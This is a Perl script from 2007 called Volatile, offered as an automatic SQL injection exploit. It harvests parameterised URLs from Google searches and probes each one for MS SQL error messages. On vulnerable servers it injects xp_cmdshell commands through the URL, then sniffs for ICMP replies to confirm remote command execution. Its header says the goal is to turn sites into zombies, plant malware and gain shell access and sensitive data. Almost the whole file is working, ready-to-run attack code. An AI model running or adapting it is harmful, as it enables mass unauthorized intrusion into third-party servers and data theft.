#!/usr/bin/perl
###############################################################
# $Id: volatile.pl,v beta 2007-07-13 22:30:34 hash Exp $
#
# Written by:
# Carlos Carvalho <carloslack *NO_SPAM* gmail.com>
#
# Volatile [Automatic SQL Injection Exploit]
#
# Description:
# 	Volatile uses Google for searching 
# 	thousands of possible SQL injection vulnerable
# 	sites and then make them act like zombies injecting 
# 	the malware and possible, giving us shell/ts access,
# 	collecting sensitive data, screenshots, etc.
#
# Files:
# 	voltatile.pl	The tool	
# 	voltatile.exe	The malware (not included)
#
# Conception and debugging help:
#
# 	Rafael Silva aka rfds
# 	<rafaelsilva NO_SPAM* rfdslabs.com.br>
# 	
# malware written by:
#	Oscar Marques aka F-117
#
#####################################

package IdentityParse;

# You better know how to use cpan -i
use Sys::Hostname;
use Net::Pcap;
use NetPacket::Ethernet qw(:strip);
use NetPacket::IP qw(:strip);
use LWP::UserAgent;
use base "HTML::Parser";
use HTML::Parser;
use Getopt::Std;

# Global variables _are_ _evil_ but we need these: 
my ($p, $ua, $object, $netmask);
my ($total,$count,$objcount,$doit) = (0,0,0,0);
my @urls;

# Here we parse command line options:
%options =();
getopts("hq:d:i:w:",\%options);

my $help = $options{h} if defined $options{h};
my $query_t =  $options{q} if defined $options{q};
my $device =  $options{d} if defined $options{d};
my $devip =  $options{i} if defined $options{i};
my $walk_t =  $options{w} if defined $options{w};

if(defined $help){
	&usage;
} else {
	&main($query_t,$walk_t);
}

sub start 
{
	my ($self, $tag, $attr, $attrseq, $origtext) = @_;
  
	if($tag =~ /^a$/i){	  
		foreach my $i (@$attrseq) {
			
			# Ignore unrelated links: 
			if ($attr->{$i} =~ /allinurl/i || $attr->{$i} =~ /q=cache/i || $attr->{$i} =~ /google/i) {
				return;
			}

			# Accept valid links:
			if($attr->{$i} =~ /http/i) {
				$count++;
				print "[$count]: $attr->{$i}\n";

				# If url shows ? then we add it 
				# to our array:
				if ($attr->{$i} =~ /\?/i){
					push(@urls, $attr->{$i});
				}
			}
		}
	}
}

# Let's wait a while for incoming icmp packets, if so
# we break the loop. If no icmp packets arrive in at least
# 10s the loop is aborted by inject_worm() funcion: 
sub parse_icmp
{
	my ($user_data, $header, $packet) = @_;

	my $ether_data = NetPacket::Ethernet::strip($packet);
	my $ip = NetPacket::IP->decode($ether_data);

	if($objcount == 2){
		$doit = 1;	
		Net::Pcap::breakloop($object);
	}
	$objcount++;
}	

# Here is where we own:
sub inject_worm
{
	my ($url) = @_;
	my ($filter, $err);
	
	chop($url);
	my $url_attack = $url;

    # Format ping command:
    my $url_t = "%20exec%20master..xp_cmdshell%20";
    $url_t .= "ping%20%3E";
    $url_t .= "$devip";
    $url_t .= "'--";

    # Append it in our url:
	$url .= $url_t;

	print "Injecting \'ping $devip\' and waiting 10s for ICMP packet...\n";
    
    # Inject the ping command:
	$ua->agent("$0/%d " . $ua->agent, rand());
	$ua->agent("Mozilla/8.0"); 
	$req = HTTP::Request->new(GET => $url); 
	$req->header('Accept' => 'text/html');
	$res = $ua->request($req);

    # Set our sniffer object:
	$object = Net::Pcap::open_live($device, 1028, 0, 1, \$err);	
	unless (defined $object){
		die "Unable do create packet capture object $err\n";
	}

    # Define the filter:
	Net::Pcap::compile(
		$object, 
		\$filter, 
		"dst $devip && (icmp[0] = 8)", #src e echo request only
		0, 
		$netmask
	) && die 'Unable to compile packet capture filter';
	Net::Pcap::setfilter($object, $filter) && die 'Unable to set packet capture filter';

	# Here is the trick to force timeout even if we
	# recieve no one ICMP packets:	
	eval{
		local $SIG{ALRM} = sub { die "alarm\n" };

		# The default timeout in seconds:
		alarm 10; 
        
		Net::Pcap::loop($object, 3, \&parse_icmp, '');
		alarm 0;
	};

	if ($@) {
		die unless $@ eq "alarm\n";
	}	

	Net::Pcap::close($object);

	$objcount = 0;

	if($doit == 1){
		$doit = 0;

		# Dummy url - create your own
		my $url_attack_t = "%20exec%20master..xp_cmdshell%20";
        	$url_attack_t .= "ping%20%3E"; 
        	$url_attack_t .= "$devip";
        	$url_attack_t .= "'--";

		$url_attack .= $url_attack_t;
	
		$ua->agent("$0/%d " . $ua->agent, rand());
		$ua->agent("Mozilla/8.0"); 
		$req = HTTP::Request->new(GET => $url_attack); 
		$req->header('Accept' => 'text/html');
		$res = $ua->request($req);
		print "Good :)\n\n";
	} else {
		print "Sorry...\n\n";
	}	
}

# Here we know the how many links we got:
sub first_query
{
	my ($query,$walk) = @_;

	$ua->agent("$0/%d " . $ua->agent, rand());
	$ua->agent("Mozilla/8.0"); 
	
	$req = HTTP::Request->new(GET => 
		"http://www.google.com.br" .
        "/search?num=$walk&q=allinurl:" .
        "$query&hl=pt-BR&sa=N"
    );
	
	$req->header('Accept' => 'text/html');
	$res = $ua->request($req);

	if ($res->is_success) {
		if(index($res->content, 'aproximadamente <b>')>=0) {
			$str = substr $res->content, index($res->content, 'aproximadamente <b>') + 19;
			$total = substr $str, 0, index($str, "</b>");
			print "Total '$query': $total\n\n";
		} else {
			$str = substr $res->content, index($res->content, 'Resultados <b>');
			$str = substr $str, index($str, 'de <b>') + 6;
			$total = substr $str, 0, index($str, "</b>");
			print "Total '$query': $total\n\n";
		}
		$p->parse($res->content);
	}
	$total =~ s/\.//g;
}

# If server looks vulnerable then it 
# calls inject_worm() function:
sub do_check
{
	my ($url) = @_;

	my $str = substr $url, index($url, '?') + 1;
	my $nurl = substr $url, 0, index($url, '?');
	$nurl .= "?";

	my @fields = split /&/, $str;

	for(my $i = 0; $i < scalar(@fields); $i++){
		if(scalar(@fields) == 1){
			 $nurl .= "$fields[$i]'";
		}else{
			 $nurl .= "$fields[$i]'&"
		}
	}

	$req = HTTP::Request->new(GET => "$nurl");
	$req->header('Accept' => 'text/html');
	$req->header('Cookies' => 'yes');
	$res = $ua->request($req);

	if ($res->is_success || index($res->status_line, "500") >= 0){
		if (index($res->content, "SQL Server") >= 0) {
			print "\n[MS SQL]::$url\n";
			inject_worm($nurl);
			return 1;
		} 
	} 
	return 0;
}

sub check_urls
{
	my $i;

	for($i = 0; $i < scalar(@urls); $i++){
		if(do_check($urls[$i]) == 1) {
			delete $urls[$i];
		}
	}
	return;
}


sub loop_in_results
{
	my ($start, $query, $walk) = @_;

	while ($start < int($total)){

		$req = HTTP::Request->new(GET => 
			"http://www.google.com.br" .
            "/search?num=$walk&q=allinurl:" .
            "$query%3F&hl=pt-BR&start=$start&sa=N"
        );

		$req->header('Accept' => 'text/html');
		$res = $ua->request($req);
		if ($res->is_success) {
			$p->parse($res->content);
			check_urls();
		} else {
			return;
		}
		$start = $start + $walk;
	}
}

# Our main function, because we are C addicted too:
sub main
{
	my ($query,$walk) = @_;
	my $start;

	$start    = $walk;
	$ua       = LWP::UserAgent->new;
	$p = new IdentityParse;

    print "Volatile [Automatic SQL Injection Exploit]\n";

	first_query($query,$walk);
	check_urls();
	loop_in_results($start,$query,$walk);

	print "Done.";
	exit;
}

sub usage
{
die <<KID

Volatile [Automatic SQL Injection Exploit] 
Written by rfds and hash

use $0 [-h|-q <query>|-w <walk>|-d <device>|-i <ip>]

	-h:	print this help
	-q:	the magic query string	[required]
	-w:	rounds per search	[required]
	-d:	external device		[required]
	-i:	the device's ip		[required]

happy hacking
KID
}	
#EOF